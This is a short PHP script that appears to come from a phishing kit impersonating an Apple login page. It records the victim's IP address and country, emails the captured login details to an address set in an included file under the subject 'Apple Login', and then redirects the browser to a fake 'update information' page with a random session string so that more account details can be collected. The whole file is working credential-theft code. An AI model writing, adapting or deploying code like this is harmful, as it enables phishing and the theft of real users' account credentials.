<?php 
session_start();
include("send/sendlogin.php");
include("send/to.php");
$ip = getenv("REMOTE_ADDR");
$subject = "Apple Login [ $ip | ".$_SESSION["COUNTRY"]." ]";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: Login <aziz>" . "\r\n";

mail($to, $subject, login(),$head);

$x=md5(microtime());$xx=sha1(microtime());
echo "<script> window.top.location.href = './updateinformation.php?cmd=_account-details&session=".$x.$xx."';   </script>";

 ?>